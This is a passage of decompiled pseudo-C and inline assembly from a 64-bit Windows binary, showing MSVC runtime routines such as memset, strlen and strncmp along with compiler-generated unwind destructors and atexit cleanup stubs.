      *(_QWORD *)(v8 - 10) = v6;
      *((_WORD *)v8 - 1) = v6;
      return result;
    case 0xBuLL:
      *(_QWORD *)(v8 - 11) = v6;
      *(_WORD *)(v8 - 3) = v6;
      *(v8 - 1) = Val;
      return result;
    case 0xCuLL:
      *(_QWORD *)(v8 - 12) = v6;
LABEL_12:
      *((_DWORD *)v8 - 1) = v6;
      return result;
    case 0xDuLL:
      *(_QWORD *)(v8 - 13) = v6;
LABEL_10:
      *(_DWORD *)(v8 - 5) = v6;
      *(v8 - 1) = Val;
      return result;
    case 0xEuLL:
      *(_QWORD *)(v8 - 14) = v6;
LABEL_7:
      *(_DWORD *)(v8 - 6) = v6;
LABEL_8:
      *((_WORD *)v8 - 1) = v6;
      return result;
    case 0xFuLL:
      *(_QWORD *)(v8 - 15) = v6;
LABEL_3:
      *(_DWORD *)(v8 - 7) = v6;
LABEL_4:
      *(_WORD *)(v8 - 3) = v6;
LABEL_5:
      *(v8 - 1) = Val;
      return result;
    default:
      v9 = _mm_unpacklo_epi64((__m128i)(unsigned __int64)v6, (__m128i)(unsigned __int64)v6);
      if ( Size <= 0x20 )
      {
        *(__m128i *)a1 = v9;
        *(__m128i *)((char *)a1 + Size - 16) = v9;
        return result;
      }
      if ( (unsigned int)dword_14009E908 < 3 )
      {
        if ( Size <= qword_14009E910 || (dword_1400A0078 & 2) == 0 )
        {
          v16 = ((unsigned __int8)a1 & 0xF) - 16LL;
          v17 = (__m128i *)((char *)a1 - v16);
          v18 = v16 + Size;
          if ( v18 > 0x80 )
          {
            do
            {
              *v17 = v9;
              v17[1] = v9;
              v17[2] = v9;
              v17[3] = v9;
              v17[4] = v9;
              v17[5] = v9;
              v17[6] = v9;
              v17[7] = v9;
              v17 += 8;
              v18 -= 128LL;
            }
            while ( v18 >= 0x80 );
          }
          v19 = (v18 + 15) & 0xFFFFFFFFFFFFFFF0uLL;
          switch ( v19 >> 4 )
          {
            case 0uLL:
              goto LABEL_60;
            case 1uLL:
              goto LABEL_59;
            case 2uLL:
              goto LABEL_58;
            case 3uLL:
              goto LABEL_57;
            case 4uLL:
              goto LABEL_56;
            case 5uLL:
              goto LABEL_55;
            case 6uLL:
              goto LABEL_54;
            case 7uLL:
              goto LABEL_53;
            case 8uLL:
              *(__m128i *)((char *)v17 + v19 - 128) = v9;
LABEL_53:
              *(__m128i *)((char *)v17 + v19 - 112) = v9;
LABEL_54:
              *(__m128i *)((char *)v17 + v19 - 96) = v9;
LABEL_55:
              *(__m128i *)((char *)v17 + v19 - 80) = v9;
LABEL_56:
              *(__m128i *)((char *)v17 + v19 - 64) = v9;
LABEL_57:
              *(__m128i *)((char *)v17 + v19 - 48) = v9;
LABEL_58:
              *(__m128i *)((char *)v17 + v19 - 32) = v9;
LABEL_59:
              *(__m128i *)((char *)v17 + v18 - 16) = v9;
LABEL_60:
              *(__m128i *)result = v9;
              break;
          }
          return result;
        }
        return (void *)memset_repstos(a1, Val, Size, (__int64)a1);
      }
      if ( Size > qword_14009E910 && Size <= qword_14009E918 && (dword_1400A0078 & 2) != 0 )
        return (void *)memset_repstos(a1, Val, Size, (__int64)a1);
      __asm { vinsertf128 ymm0, ymm0, xmm0, 1 }
      v11 = ((unsigned __int8)a1 & 0x1F) - 32LL;
      _RCX = (char *)a1 - v11;
      _R8 = v11 + Size;
      if ( _R8 <= 0x100 )
        goto LABEL_26;
      if ( _R8 <= qword_14009E918 )
      {
        do
        {
          __asm
          {
            vmovdqa ymmword ptr [rcx], ymm0
            vmovdqa ymmword ptr [rcx+20h], ymm0
            vmovdqa ymmword ptr [rcx+40h], ymm0
            vmovdqa ymmword ptr [rcx+60h], ymm0
            vmovdqa ymmword ptr [rcx+80h], ymm0
            vmovdqa ymmword ptr [rcx+0A0h], ymm0
            vmovdqa ymmword ptr [rcx+0C0h], ymm0
            vmovdqa ymmword ptr [rcx+0E0h], ymm0
          }
          _RCX += 256;
          _R8 -= 256LL;
        }
        while ( _R8 >= 0x100 );
LABEL_26:
        _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;
        switch ( _R9 >> 5 )
        {
          case 0uLL:
            goto LABEL_35;
          case 1uLL:
            goto LABEL_34;
          case 2uLL:
            goto LABEL_33;
          case 3uLL:
            goto LABEL_32;
          case 4uLL:
            goto LABEL_31;
          case 5uLL:
            goto LABEL_30;
          case 6uLL:
            goto LABEL_29;
          case 7uLL:
            goto LABEL_28;
          case 8uLL:
            __asm { vmovdqu ymmword ptr [rcx+r9-100h], ymm0; jumptable 000000014002B384 case 8 }
LABEL_28:
            __asm { vmovdqu ymmword ptr [rcx+r9-0E0h], ymm0; jumptable 000000014002B384 case 7 }
LABEL_29:
            __asm { vmovdqu ymmword ptr [rcx+r9-0C0h], ymm0; jumptable 000000014002B384 case 6 }
LABEL_30:
            __asm { vmovdqu ymmword ptr [rcx+r9-0A0h], ymm0; jumptable 000000014002B384 case 5 }
LABEL_31:
            __asm { vmovdqu ymmword ptr [rcx+r9-80h], ymm0; jumptable 000000014002B384 case 4 }
LABEL_32:
            __asm { vmovdqu ymmword ptr [rcx+r9-60h], ymm0; jumptable 000000014002B384 case 3 }
LABEL_33:
            __asm { vmovdqu ymmword ptr [rcx+r9-40h], ymm0; jumptable 000000014002B384 case 2 }
LABEL_34:
            __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm0; jumptable 000000014002B384 case 1 }
LABEL_35:
            __asm
            {
              vmovdqu ymmword ptr [rax], ymm0; jumptable 000000014002B384 case 0
              vzeroupper
            }
            break;
        }
        return result;
      }
      do
      {
        __asm
        {
          vmovntdq ymmword ptr [rcx], ymm0
          vmovntdq ymmword ptr [rcx+20h], ymm0
          vmovntdq ymmword ptr [rcx+40h], ymm0
          vmovntdq ymmword ptr [rcx+60h], ymm0
          vmovntdq ymmword ptr [rcx+80h], ymm0
          vmovntdq ymmword ptr [rcx+0A0h], ymm0
          vmovntdq ymmword ptr [rcx+0C0h], ymm0
          vmovntdq ymmword ptr [rcx+0E0h], ymm0
        }
        _RCX += 256;
        _R8 -= 256LL;
      }
      while ( _R8 >= 0x100 );
      _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;
      switch ( _R9 >> 5 )
      {
        case 0uLL:
          goto LABEL_46;
        case 1uLL:
          goto LABEL_45;
        case 2uLL:
          goto LABEL_44;
        case 3uLL:
          goto LABEL_43;
        case 4uLL:
          goto LABEL_42;
        case 5uLL:
          goto LABEL_41;
        case 6uLL:
          goto LABEL_40;
        case 7uLL:
          goto LABEL_39;
        case 8uLL:
          __asm { vmovntdq ymmword ptr [rcx+r9-100h], ymm0; jumptable 000000014002B444 case 8 }
LABEL_39:
          __asm { vmovntdq ymmword ptr [rcx+r9-0E0h], ymm0; jumptable 000000014002B444 case 7 }
LABEL_40:
          __asm { vmovntdq ymmword ptr [rcx+r9-0C0h], ymm0; jumptable 000000014002B444 case 6 }
LABEL_41:
          __asm { vmovntdq ymmword ptr [rcx+r9-0A0h], ymm0; jumptable 000000014002B444 case 5 }
LABEL_42:
          __asm { vmovntdq ymmword ptr [rcx+r9-80h], ymm0; jumptable 000000014002B444 case 4 }
LABEL_43:
          __asm { vmovntdq ymmword ptr [rcx+r9-60h], ymm0; jumptable 000000014002B444 case 3 }
LABEL_44:
          __asm { vmovntdq ymmword ptr [rcx+r9-40h], ymm0; jumptable 000000014002B444 case 2 }
LABEL_45:
          __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm0; jumptable 000000014002B444 case 1 }
LABEL_46:
          __asm { vmovdqu ymmword ptr [rax], ymm0; jumptable 000000014002B444 case 0 }
          _mm_sfence();
          __asm { vzeroupper }
          break;
      }
      return result;
  }
}


// ----- strlen @ 0x14002b590 -----
size_t __cdecl strlen(const char *Str)
{
  const char *v1; // rax
  __int64 v2; // rcx
  char v3; // dl
  __int64 v4; // rdx
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // rdx
  unsigned int v8; // edx

  v1 = Str;
  v2 = -(__int64)Str;
  if ( ((unsigned __int8)v1 & 7) == 0 )
    goto main_loop_begin;
  do
  {
    v3 = *v1++;
    if ( v3 == 0 )
      return (size_t)&v1[v2 - 1];
  }
  while ( ((unsigned __int8)v1 & 7) != 0 );
  while ( 1 )
  {
    do
    {
main_loop_begin:
      v4 = *(_QWORD *)v1;
      v1 += 8;
    }
    while ( (((v4 + 0x7EFEFEFEFEFEFEFFLL) ^ ~v4) & 0x8101010101010100uLL) == 0 );
    v5 = *((_QWORD *)v1 - 1);
    if ( (_BYTE)v5 == 0 )
      break;
    if ( BYTE1(v5) == 0 )
      return (size_t)&v1[v2 - 7];
    v6 = v5 >> 16;
    if ( (_BYTE)v6 == 0 )
      return (size_t)&v1[v2 - 6];
    if ( BYTE1(v6) == 0 )
      return (size_t)&v1[v2 - 5];
    v7 = v6 >> 16;
    if ( (_BYTE)v7 == 0 )
      return (size_t)&v1[v2 - 4];
    if ( BYTE1(v7) == 0 )
      return (size_t)&v1[v2 - 3];
    v8 = WORD1(v7);
    if ( (_BYTE)v8 == 0 )
      return (size_t)&v1[v2 - 2];
    if ( BYTE1(v8) == 0 )
      return (size_t)&v1[v2 - 1];
  }
  return (size_t)&v1[v2 - 8];
}


// ----- strncmp @ 0x14002b650 -----
int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)
{
  signed __int64 v3; // rdx
  unsigned __int8 v4; // al
  __int64 v5; // rax
  bool v6; // cc
  __int64 v7; // rax

  v3 = Str2 - Str1;
  if ( MaxCount != 0 )
  {
    if ( ((unsigned __int8)Str1 & 7) == 0 )
    {
_qword_loop_begin:
      while ( (((_WORD)v3 + (_WORD)Str1) & 0xFFFu) <= 0xFF8 )
      {
        v5 = *(_QWORD *)Str1;
        if ( *(_QWORD *)Str1 != *(_QWORD *)&Str1[v3] )
          break;
        Str1 += 8;
        v6 = MaxCount <= 8;
        MaxCount -= 8LL;
        if ( v6 || ((v5 - 0x101010101010101LL) & ~v5 & 0x8080808080808080uLL) != 0 )
          goto return_equal;
      }
    }
    while ( 1 )
    {
      v4 = *Str1;
      if ( *Str1 != Str1[v3] )
        return -(__int64)(v4 < (unsigned int)Str1[v3]) | 1;
      ++Str1;
      if ( --MaxCount == 0 || v4 == 0 )
        goto return_equal;
      if ( ((unsigned __int8)Str1 & 7) == 0 )
        goto _qword_loop_begin;
    }
  }
  else
  {
return_equal:
    LODWORD(v7) = 0;
  }
  return v7;
}


// ----- sub_14002B6D0 @ 0x14002b6d0 -----
__int64 __fastcall sub_14002B6D0(__int64 a1, __int64 a2)
{
  return sub_140006E30(a2 + 152);
}


// ----- sub_14002B6F0 @ 0x14002b6f0 -----
__int64 (__fastcall ***__fastcall sub_14002B6F0(__int64 a1, __int64 a2))(_QWORD, __int64)
{
  return sub_140006DC0(a2 + 136);
}


// ----- sub_14002B710 @ 0x14002b710 -----
void *__fastcall sub_14002B710(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a2 + 104) = *(int *)(**(_QWORD **)(a2 + 192) + 4LL) + *(_QWORD *)(a2 + 192);
  sub_14000DA70(*(__crt_win32_buffer_debug_info **)(a2 + 104), 4, 1u);
  return &loc_140001A48;
}


// ----- sub_14002B760 @ 0x14002b760 -----
__int64 __fastcall sub_14002B760(__int64 a1, __int64 a2)
{
  return sub_140006500((_QWORD *)(a2 + 48));
}


// ----- unknown_libname_53 @ 0x14002b780 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_53(__int64 a1, __int64 a2)
{
  return sub_140006B20((_QWORD *)(a2 + 120));
}


// ----- sub_14002B7A0 @ 0x14002b7a0 -----
__int64 __fastcall sub_14002B7A0(__int64 a1, __int64 a2)
{
  return sub_140006BF0((_QWORD *)(a2 + 80));
}


// ----- ?dtor$0@?0??_wcstombs_l_helper@@YA_KPEADPEB_W_KPEAU__crt_locale_pointers@@@Z@4HA @ 0x14002b7c0 -----
void `_wcstombs_l_helper'::`1'::dtor$0()
{
  sub_140006530();
}


// ----- sub_14002B7E0 @ 0x14002b7e0 -----
void sub_14002B7E0()
{
  sub_140006530();
}


// ----- sub_14002B800 @ 0x14002b800 -----
void __fastcall sub_14002B800(__int64 a1, __int64 a2)
{
  std::_Lockit::~_Lockit((std::_Lockit *)(a2 + 72));
}


// ----- sub_14002B820 @ 0x14002b820 -----
__int64 __fastcall sub_14002B820(__int64 a1, __int64 a2)
{
  return sub_1400069C0((_QWORD *)(a2 + 80));
}


// ----- ?dtor$0@?0???0?$basic_iostream@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z@4HA @ 0x14002b840 -----
void __fastcall `std::iostream::iostream'::`1'::dtor$0(__int64 a1, __int64 a2)
{
  if ( (*(_DWORD *)(a2 + 32) & 1) != 0 )
  {
    *(_DWORD *)(a2 + 32) &= ~1u;
    std::ios_base::~ios_base((std::ios_base *)(*(_QWORD *)(a2 + 64) + 32LL));
  }
}


// ----- sub_14002B870 @ 0x14002b870 -----
__int64 __fastcall sub_14002B870(__int64 a1, __int64 a2)
{
  return sub_140006690(*(_QWORD *)(a2 + 64) + 24LL);
}


// ----- sub_14002B890 @ 0x14002b890 -----
void __fastcall sub_14002B890(__int64 a1, __int64 a2)
{
  if ( (*(_DWORD *)(a2 + 32) & 1) != 0 )
  {
    *(_DWORD *)(a2 + 32) &= ~1u;
    std::ios_base::~ios_base((std::ios_base *)(*(_QWORD *)(a2 + 64) + 24LL));
  }
}


// ----- sub_14002B8C0 @ 0x14002b8c0 -----
void __fastcall sub_14002B8C0(__int64 a1, __int64 a2)
{
  if ( (*(_DWORD *)(a2 + 32) & 1) != 0 )
  {
    *(_DWORD *)(a2 + 32) &= ~1u;
    std::ios_base::~ios_base((std::ios_base *)(*(_QWORD *)(a2 + 80) + 168LL));
  }
}


// ----- sub_14002B8F0 @ 0x14002b8f0 -----
__int64 __fastcall sub_14002B8F0(__int64 a1, __int64 a2)
{
  return sub_140006770(*(_QWORD *)(a2 + 80) + 16LL);
}


// ----- ?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA @ 0x14002b910 -----
__int64 __fastcall `std::_Locinfo::_Locinfo'::`1'::dtor$1(__int64 a1, __int64 a2)
{
  return sub_140006580(*(_QWORD *)(a2 + 80) + 8LL);
}


// ----- sub_14002B930 @ 0x14002b930 -----
void __fastcall sub_14002B930(__int64 a1, __int64 a2)
{
  if ( (*(_DWORD *)(a2 + 32) & 1) != 0 )
  {
    *(_DWORD *)(a2 + 32) &= ~1u;
    std::ios_base::~ios_base((std::ios_base *)(*(_QWORD *)(a2 + 64) + 16LL));
  }
}


// ----- sub_14002B960 @ 0x14002b960 -----
__int64 __fastcall sub_14002B960(__int64 a1, __int64 a2)
{
  return sub_1400064C0(*(_QWORD *)(a2 + 96));
}


// ----- sub_14002B980 @ 0x14002b980 -----
__int64 __fastcall sub_14002B980(__int64 a1, __int64 a2)
{
  return sub_1400064C0(*(_QWORD *)(a2 + 64));
}


// ----- ?dtor$4@?0??_Makexloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z@4HA @ 0x14002b9a0 -----
__int64 __fastcall `std::locale::_Locimp::_Makexloc'::`1'::dtor$4(__int64 a1, __int64 a2)
{
  return sub_1400064C0(*(_QWORD *)(a2 + 128));
}


// ----- sub_14002B9C0 @ 0x14002b9c0 -----
__int64 __fastcall sub_14002B9C0(__int64 a1, __int64 a2)
{
  return sub_1400067C0(*(_QWORD **)(a2 + 80));
}


// ----- unknown_libname_54 @ 0x14002b9e0 -----
// Microsoft VisualC v14 64bit runtime
void __fastcall unknown_libname_54(__int64 a1, __int64 a2)
{
  if ( (*(_DWORD *)(a2 + 32) & 1) != 0 )
  {
    *(_DWORD *)(a2 + 32) &= ~1u;
    std::ios_base::~ios_base((std::ios_base *)(*(_QWORD *)(a2 + 64) + 152LL));
  }
}


// ----- unknown_libname_55 @ 0x14002ba10 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_55(__int64 a1, __int64 a2)
{
  return std::iostream::~iostream<char,std::char_traits<char>>(*(_QWORD *)(a2 + 64) + 32LL);
}


// ----- sub_14002BA30 @ 0x14002ba30 -----
void __fastcall sub_14002BA30(__int64 a1, __int64 a2)
{
  std::ios_base::~ios_base(*(std::ios_base **)(a2 + 48));
}


// ----- sub_14002BA50 @ 0x14002ba50 -----
void __fastcall sub_14002BA50(__int64 a1, __int64 a2)
{
  std::ios_base::~ios_base(*(std::ios_base **)(a2 + 48));
}


// ----- ?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA @ 0x14002ba70 -----
void __fastcall `std::_Locinfo::_Locinfo'::`1'::dtor$0(__int64 a1, __int64 a2)
{
  std::_Lockit::~_Lockit(*(std::_Lockit **)(a2 + 64));
}


// ----- ?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA_0 @ 0x14002ba90 -----
__int64 __fastcall `std::_Locinfo::_Locinfo'::`1'::dtor$1(__int64 a1, __int64 a2)
{
  return sub_140006560(*(_QWORD *)(a2 + 64) + 8LL);
}


// ----- sub_14002BAB0 @ 0x14002bab0 -----
__int64 __fastcall sub_14002BAB0(__int64 a1, __int64 a2)
{
  return sub_140006560(*(_QWORD *)(a2 + 64) + 24LL);
}


// ----- sub_14002BAD0 @ 0x14002bad0 -----
__int64 __fastcall sub_14002BAD0(__int64 a1, __int64 a2)
{
  return sub_140006560(*(_QWORD *)(a2 + 64) + 40LL);
}


// ----- ?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA @ 0x14002baf0 -----
__int64 __fastcall `std::_Locinfo::_Locinfo'::`1'::dtor$4(__int64 a1, __int64 a2)
{
  return sub_140006560(*(_QWORD *)(a2 + 64) + 56LL);
}


// ----- ?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA @ 0x14002bb10 -----
__int64 __fastcall `std::_Locinfo::_Locinfo'::`1'::dtor$5(__int64 a1, __int64 a2)
{
  return sub_140006560(*(_QWORD *)(a2 + 64) + 72LL);
}


// ----- ?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA @ 0x14002bb30 -----
__int64 __fastcall `std::_Locinfo::_Locinfo'::`1'::dtor$6(__int64 a1, __int64 a2)
{
  return sub_140006560(*(_QWORD *)(a2 + 64) + 88LL);
}


// ----- unknown_libname_88 @ 0x14002bb50 -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_88(__int64 a1, __int64 a2)
{
  return sub_140006820(a2 + 112);
}


// ----- sub_14002BB70 @ 0x14002bb70 -----
__int64 __fastcall sub_14002BB70(__int64 a1, __int64 a2)
{
  return sub_140006850(*(_QWORD *)(a2 + 880));
}


// ----- sub_14002BB90 @ 0x14002bb90 -----
__int64 __fastcall sub_14002BB90(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 152);
}


// ----- unknown_libname_56 @ 0x14002bbb0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_56(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 120);
}


// ----- sub_14002BBD0 @ 0x14002bbd0 -----
__int64 __fastcall sub_14002BBD0(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 280);
}


// ----- sub_14002BBF0 @ 0x14002bbf0 -----
__int64 __fastcall sub_14002BBF0(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 248);
}


// ----- sub_14002BC10 @ 0x14002bc10 -----
__int64 __fastcall sub_14002BC10(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 216);
}


// ----- sub_14002BC30 @ 0x14002bc30 -----
__int64 __fastcall sub_14002BC30(__int64 a1, __int64 a2)
{
  return sub_140006B90(*(_QWORD *)(a2 + 64));
}


// ----- sub_14002BC50 @ 0x14002bc50 -----
__int64 __fastcall sub_14002BC50(__int64 a1, __int64 a2)
{
  return sub_140006820(a2 + 48);
}


// ----- sub_14002BC70 @ 0x14002bc70 -----
void __fastcall sub_14002BC70(__int64 a1, __int64 a2)
{
  j_j_j__free_base(*(void **)(a2 + 40));
}


// ----- sub_14002BC90 @ 0x14002bc90 -----
void __fastcall sub_14002BC90(__int64 a1, __int64 a2)
{
  if ( (*(_DWORD *)(a2 + 32) & 1) != 0 )
  {
    *(_DWORD *)(a2 + 32) &= ~1u;
    sub_140006A90((struct std::_Locinfo *)(a2 + 88));
  }
}


// ----- unknown_libname_57 @ 0x14002bcc0 -----
// Microsoft VisualC v14 64bit runtime
void __fastcall unknown_libname_57(__int64 a1, __int64 a2)
{
  j_j_j__free_base(*(void **)(a2 + 40));
}


// ----- unknown_libname_89 @ 0x14002bce0 -----
// Microsoft VisualC 64bit universal runtime
__int64 (__fastcall ***__fastcall unknown_libname_89(__int64 a1, __int64 a2))(_QWORD, __int64)
{
  return sub_140006DC0(a2 + 112);
}


// ----- sub_14002BD00 @ 0x14002bd00 -----
void *__fastcall sub_14002BD00(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a2 + 96) = *(int *)(**(_QWORD **)(a2 + 144) + 4LL) + *(_QWORD *)(a2 + 144);
  sub_14000DA70(*(__crt_win32_buffer_debug_info **)(a2 + 96), 4, 1u);
  return &loc_140009278;
}


// ----- ?dtor$4@?0??_Makexloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z@4HA_0 @ 0x14002bd50 -----
__int64 __fastcall `std::locale::_Locimp::_Makexloc'::`1'::dtor$4(__int64 a1, __int64 a2)
{
  return sub_140006820(*(_QWORD *)(a2 + 128));
}


// ----- ?dtor$0@?0???$__acrt_get_current_directory_narrow_acp_or_utf8@U__crt_win32_buffer_internal_dynamic_resizing@@@@YAHAEAV?$__crt_win32_buffer@DU__crt_win32_buffer_internal_dynamic_resizing@@@@@Z@4HA @ 0x14002bd70 -----
__int64 __fastcall `__acrt_get_current_directory_narrow_acp_or_utf8<__crt_win32_buffer_internal_dynamic_resizing>'::`1'::dtor$0(
        __int64 a1,
        __int64 a2)
{
  return sub_140006820(a2 + 64);
}


// ----- unknown_libname_58 @ 0x14002bd90 -----
// Microsoft VisualC v14 64bit runtime
void *unknown_libname_58()
{
  return &loc_14000958C;
}


// ----- sub_14002BDB0 @ 0x14002bdb0 -----
void __fastcall sub_14002BDB0(__int64 a1, __int64 a2)
{
  sub_140007310(a2 + 176);
}


// ----- sub_14002BDD0 @ 0x14002bdd0 -----
__int64 __fastcall sub_14002BDD0(__int64 a1, __int64 a2)
{
  return sub_140006820(a2 + 136);
}


// ----- sub_14002BDF0 @ 0x14002bdf0 -----
void __fastcall sub_14002BDF0(__int64 a1, __int64 a2)
{
  std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vbase destructor'(a2 + 448);
}


// ----- ?dtor$0@?0??_wcrtomb_s_l@@YAHQEAHQEAD_K_WQEAU_Mbstatet@@QEAU__crt_locale_pointers@@@Z@4HA @ 0x14002be10 -----
__int64 __fastcall `_wcrtomb_s_l'::`1'::dtor$0(__int64 a1, __int64 a2)
{
  return sub_140006820(a2 + 104);
}


// ----- sub_14002BE30 @ 0x14002be30 -----
__int64 __fastcall sub_14002BE30(__int64 a1, __int64 a2)
{
  return sub_140006A10(a2 + 80);
}


// ----- ?dtor$0@?0???$__acrt_get_current_directory_narrow_acp_or_utf8@U__crt_win32_buffer_internal_dynamic_resizing@@@@YAHAEAV?$__crt_win32_buffer@DU__crt_win32_buffer_internal_dynamic_resizing@@@@@Z@4HA_0 @ 0x14002be50 -----
__int64 __fastcall `__acrt_get_current_directory_narrow_acp_or_utf8<__crt_win32_buffer_internal_dynamic_resizing>'::`1'::dtor$0(
        __int64 a1,
        __int64 a2)
{
  return sub_140006E50((_QWORD *)(a2 + 64));
}


// ----- sub_14002BE70 @ 0x14002be70 -----
void *__fastcall sub_14002BE70(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a2 + 48) = *(int *)(**(_QWORD **)(a2 + 112) + 4LL) + *(_QWORD *)(a2 + 112);
  sub_14000DA70(*(__crt_win32_buffer_debug_info **)(a2 + 48), 4, 1u);
  return &loc_14000B5D3;
}


// ----- sub_14002BEC0 @ 0x14002bec0 -----
__int64 (__fastcall ***__fastcall sub_14002BEC0(__int64 a1, __int64 a2))(_QWORD, __int64)
{
  return sub_140006DC0(a2 + 56);
}


// ----- sub_14002BEE0 @ 0x14002bee0 -----
__int64 __fastcall sub_14002BEE0(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = *(_DWORD *)(a2 + 48) & 1;
  if ( (_DWORD)result != 0 )
  {
    *(_DWORD *)(a2 + 48) &= ~1u;
    return sub_140006850(*(_QWORD *)(a2 + 160));
  }
  return result;
}


// ----- sub_14002BF10 @ 0x14002bf10 -----
__int64 __fastcall sub_14002BF10(__int64 a1, __int64 a2)
{
  return sub_140006820(a2 + 176);
}


// ----- ?dtor$0@?0???$__acrt_get_current_directory_narrow_acp_or_utf8@U__crt_win32_buffer_internal_dynamic_resizing@@@@YAHAEAV?$__crt_win32_buffer@DU__crt_win32_buffer_internal_dynamic_resizing@@@@@Z@4HA_1 @ 0x14002bf30 -----
__int64 (__fastcall ***__fastcall `__acrt_get_current_directory_narrow_acp_or_utf8<__crt_win32_buffer_internal_dynamic_resizing>'::`1'::dtor$0(
        __int64 a1,
        __int64 a2))(_QWORD, __int64)
{
  return sub_140006DC0(a2 + 64);
}


// ----- sub_14002BF50 @ 0x14002bf50 -----
__int64 __fastcall sub_14002BF50(__int64 a1, __int64 a2)
{
  return sub_140006E50((_QWORD *)(a2 + 80));
}


// ----- sub_14002BF70 @ 0x14002bf70 -----
void *__fastcall sub_14002BF70(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a2 + 56) = *(int *)(**(_QWORD **)(a2 + 128) + 4LL) + *(_QWORD *)(a2 + 128);
  sub_14000DA70(*(__crt_win32_buffer_debug_info **)(a2 + 56), 4, 1u);
  return &loc_14000E7FB;
}


// ----- unknown_libname_60 @ 0x14002bfc0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_60(__int64 a1, __int64 a2)
{
  return sub_140006D60(a2 + 120);
}


// ----- ?dtor$0@?0??_wcstombs_l_helper@@YA_KPEADPEB_W_KPEAU__crt_locale_pointers@@@Z@4HA_0 @ 0x14002bfe0 -----
__int64 __fastcall `_wcstombs_l_helper'::`1'::dtor$0(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 88);
}


// ----- sub_14002C000 @ 0x14002c000 -----
__int64 __fastcall sub_14002C000(__int64 a1, __int64 a2)
{
  return sub_140006850(a2 + 176);
}


// ----- sub_14002C01B @ 0x14002c01b -----
void __fastcall sub_14002C01B(__int64 a1, __int64 a2)
{
  std::_Lockit::~_Lockit((std::_Lockit *)(a2 + 48));
}


// ----- unknown_libname_93 @ 0x14002c4fe -----
// Microsoft VisualC 64bit universal runtime
void __fastcall unknown_libname_93(__int64 a1, __int64 a2)
{
  if ( *(_QWORD *)(a2 + 32) == 0 )
    __acrt_stdio_free_stream(*(_QWORD *)(a2 + 64));
  unlock_file(*(FILE **)(a2 + 64));
}


// ----- _free_locale$fin$1 @ 0x14002c681 -----
void free_locale_fin_1()
{
  _vcrt_unlock(5);
}


// ----- unknown_libname_100 @ 0x14002c6b3 -----
// Microsoft VisualC 64bit universal runtime
void __fastcall unknown_libname_100(__int64 a1, __int64 a2)
{
  int *v2; // r9

  if ( *(_DWORD *)(a2 + 64) != 0 )
  {
    if ( *(_DWORD *)(a2 + 68) != 0 )
    {
      v2 = *(int **)(a2 + 128);
      *(_BYTE *)(qword_1400A0680[(__int64)*v2 >> 6] + 72LL * (*v2 & 0x3F) + 56) &= ~1u;
    }
    _acrt_lowio_unlock_fh(**(_DWORD **)(a2 + 128));
  }
}


// ----- sub_14002C750 @ 0x14002c750 -----
void __fastcall sub_14002C750()
{
  sub_140006A30((__int64)qword_14009FC18);
}


// ----- sub_14002C768 @ 0x14002c768 -----
void __fastcall sub_14002C768()
{
  unknown_libname_47();
}


// ----- sub_14002C774 @ 0x14002c774 -----
void __fastcall sub_14002C774()
{
  __int64 v0; // rcx
  void (__fastcall ***v1)(_QWORD, __int64); // rax
  void *v2; // rbx

  while ( 1 )
  {
    v2 = qword_14009FDE8;
    if ( qword_14009FDE8 == nullptr )
      break;
    v0 = *((_QWORD *)qword_14009FDE8 + 1);
    qword_14009FDE8 = *(void **)qword_14009FDE8;
    v1 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + 16LL))(v0);
    if ( v1 != nullptr )
      (**v1)(v1, 1);
    j__free_base(v2);
  }
}


// ----- ??__Fclassic_locale@std@@YAXXZ @ 0x14002c7cc -----
void std::`dynamic atexit destructor for 'classic_locale''()
{
  void (__fastcall ***v0)(_QWORD, __int64); // rax

  if ( qword_14009FDD8 != 0 )
  {
    v0 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)qword_14009FDD8 + 16LL))(qword_14009FDD8);
    if ( v0 != nullptr )
      (**v0)(v0, 1);
  }
}


// ----- unknown_libname_68 @ 0x14002c80c -----
// Microsoft VisualC v14 64bit runtime
__int64 unknown_libname_68()
{
  void *v0; // rcx
  void (*v1)(void); // rax
  __int64 result; // rax

  while ( 1 )
  {
    result = qword_14009E880;
    if ( (unsigned __int64)qword_14009E880 >= 0xA )
      break;
    v0 = (void *)qword_14009FEF0[qword_14009E880++];
    v1 = (void (*)(void))DecodePointer(v0);
    if ( v1 != nullptr )
      v1();
  }
  return result;
}


// ----- sub_14002C84C @ 0x14002c84c -----
